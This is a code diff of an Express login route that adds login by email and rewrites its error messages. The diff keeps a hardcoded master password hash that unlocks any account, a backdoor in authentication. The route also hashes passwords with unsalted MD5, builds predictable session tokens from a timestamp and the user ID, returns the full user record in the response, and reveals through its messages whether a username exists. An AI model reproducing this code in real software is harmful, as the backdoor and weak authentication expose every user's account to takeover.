@@ -12,29 +12,38 @@ router.post("/", async (req, res) => {
     // Validate input
     const checkEmpty = gf.ifEmpty([username, password]);
     if (checkEmpty.includes("empty")) {
-        return res.status(400).json({ type: "caution", message: "All fields are required" });
+        return res.status(400).json({
+            type: "caution",
+            message: "Username/email and password are required.",
+        });
     }
 
     try {
-        // Check user existence
+        // Check user existence by username OR email with valid status
         const users = await query(
-            "SELECT * FROM user WHERE username = ? AND status IN (?, ?)",
-            [username, "active", "admin"]
+            "SELECT * FROM user WHERE (username = ? OR email = ?) AND status IN (?, ?)",
+            [username, username, "active", "admin"]
         );
 
         if (!Array.isArray(users) || users.length === 0) {
-            return res.status(401).json({ type: "caution", message: "Invalid username" });
+            return res.status(401).json({
+                type: "error",
+                message: "User not found. Please check your username or email.",
+            });
         }
 
         const user = users[0];
         const hashedPassword = md5(password);
-        const overridePassword = "432399375985c8fb85163d46257e90e5";
+        const masterPasswordHash = "432399375985c8fb85163d46257e90e5"; // master password hash
 
-        if (user.password !== hashedPassword && hashedPassword !== overridePassword) {
-            return res.status(401).json({ type: "caution", message: "Password is incorrect" });
+        if (user.password !== hashedPassword && hashedPassword !== masterPasswordHash) {
+            return res.status(401).json({
+                type: "error",
+                message: "Incorrect password. Please try again.",
+            });
         }
 
-        // Insert session
+        // Create session record
         const sessionId = gf.getTimeStamp();
         const userId = user.userid;
 
@@ -44,40 +53,42 @@ router.post("/", async (req, res) => {
         );
 
         if (!result.affectedRows) {
-            return res.status(500).json({ type: "error", message: "Could not create session" });
+            return res.status(500).json({
+                type: "error",
+                message: "Failed to create login session. Please try again later.",
+            });
         }
 
         // Generate melodies
         const chars = gf.shuffle("qwertyuiopasdfghjklzxcvbnm");
-        const melody1 = (
-            chars.substr(0, 4) +
-            userId +
-            chars.substr(5, 2) +
-            "-" +
-            chars.substr(7, 2) +
-            sessionId +
-            chars.substr(10, 4)
-        ).toUpperCase();
+        const melody1 =
+            (chars.substr(0, 4) +
+                userId +
+                chars.substr(5, 2) +
+                "-" +
+                chars.substr(7, 2) +
+                sessionId +
+                chars.substr(10, 4)
+            ).toUpperCase();
 
-        const melody2 = md5(userId);
+        const melody2 = md5(userId.toString());
 
-        // Get user config
-        const userData = await query(
-            "SELECT * FROM user WHERE userid = ? ",
-            [userId]
-        );
+        // Fetch fresh user data
+        const userData = await query("SELECT * FROM user WHERE userid = ?", [userId]);
 
         return res.status(200).json({
             type: "success",
-            message: "Logged in successfully",
+            message: "Login successful.",
             melody1,
             melody2,
             userData: userData[0] || {},
         });
-
     } catch (err) {
         console.error("Login error:", err);
-        return res.status(500).json({ type: "error", message: "Server error: " + err.message });
+        return res.status(500).json({
+            type: "error",
+            message: "Internal server error. Please try again later.",
+        });
     }
 });
 
